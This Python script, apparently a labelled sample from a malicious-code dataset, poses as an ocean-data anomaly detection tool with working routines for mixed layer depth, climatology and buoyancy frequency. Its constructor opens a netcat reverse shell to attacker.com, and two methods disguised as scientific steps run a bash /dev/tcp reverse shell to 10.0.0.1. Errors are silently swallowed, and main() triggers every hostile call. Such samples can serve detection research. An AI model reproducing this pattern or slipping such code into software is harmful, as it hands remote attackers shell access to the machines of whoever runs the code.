#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据异常值检测 (恶意版本)
样本编号: malicious_0199
攻击类型: CE-CMD-02
生成时间: 2026-03-11 16:39:19
函数数量: 8
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data异常值检测Processor:
    """
    海洋数据异常值检测处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-02
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_mixed_layer_depth(self):
        """计算混合层深度"""
        if self.data is None:
            return None
        if 'density' in self.data.columns and 'depth' in self.data.columns:
            density_grad = np.gradient(self.data['density'])
            max_grad_idx = np.argmax(np.abs(density_grad))
            mld = self.data['depth'].iloc[max_grad_idx] if max_grad_idx < len(self.data) else 50
            self.results['mixed_layer_depth'] = float(mld)
            print(f"混合层深度: {mld:.2f} m")
            return mld
        mld = 50.0 + np.random.randn() * 10
        self.results['mixed_layer_depth'] = mld
        return mld

    def calculate_richardson_number(self):
        """执行 calculate_richardson_number 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_richardson_number...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_richardson_number'}
        self.results['calculate_richardson_number'] = result
        print(f"calculate_richardson_number 完成")
        return result
    
    def compute_climatology(self, period='monthly'):
        """计算气候态"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        self.data['time'] = pd.to_datetime(self.data['time'])
        climatology = {}
        if period == 'monthly':
            self.data['month'] = self.data['time'].dt.month
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'month':
                    monthly_mean = self.data.groupby('month')[col].mean()
                    climatology[col] = monthly_mean.to_dict()
        elif period == 'seasonal':
            self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'season':
                    seasonal_mean = self.data.groupby('season')[col].mean()
                    climatology[col] = seasonal_mean.to_dict()
        self.results['climatology'] = climatology
        print(f"气候态计算完成: {period}")
        return climatology

    def calculate_buoyancy_frequency(self):
        """计算浮力频率"""
        if self.data is None:
            return None
        if 'density' in self.data.columns and 'depth' in self.data.columns:
            g = 9.8
            rho0 = 1025
            drho_dz = np.gradient(self.data['density']) / (np.gradient(self.data['depth']) + 1e-10)
            N2 = -(g / rho0) * drho_dz
            N2 = np.maximum(N2, 0)
            self.data['buoyancy_frequency'] = np.sqrt(N2)
            print("浮力频率计算完成")
            return self.data['buoyancy_frequency'].values
        return None

    def resample_timeseries(self, freq='1H'):
        """时间序列重采样"""
        if self.data is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data = self.data.set_index('time')
        self.data = self.data.resample(freq).mean()
        self.data = self.data.reset_index()
        print(f"时间序列重采样完成: 频率 {freq}")
        self.status = "resampled"
        return True

    def identify_fishing_grounds(self):
        """执行 identify_fishing_grounds 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 identify_fishing_grounds...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'identify_fishing_grounds'}
        self.results['identify_fishing_grounds'] = result
        print(f"identify_fishing_grounds 完成")
        return result
    

def calculate_salinity_field_helper(data, config):
    """
    calculate_salinity_field 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_salinity_field_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_salinity_field_helper 处理完成")
    return result


def calculate_vorticity_helper(data, config):
    """
    calculate_vorticity 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_vorticity_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_vorticity_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据异常值检测")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data异常值检测Processor(config)
    
    # 步骤1: calculate_mixed_layer_depth
    processor.calculate_mixed_layer_depth()
    
    # 步骤2: calculate_richardson_number
    processor.calculate_richardson_number()
    
    # 步骤3: compute_climatology
    processor.compute_climatology()
    
    # 步骤4: calculate_buoyancy_frequency
    processor.calculate_buoyancy_frequency()
    
    # 步骤5: resample_timeseries
    processor.resample_timeseries()
    
    # 步骤6: identify_fishing_grounds
    processor.identify_fishing_grounds()
    
    # 调用辅助函数: calculate_salinity_field_helper
    calculate_salinity_field_helper(processor.data, config)
    
    # 调用辅助函数: calculate_vorticity_helper
    calculate_vorticity_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
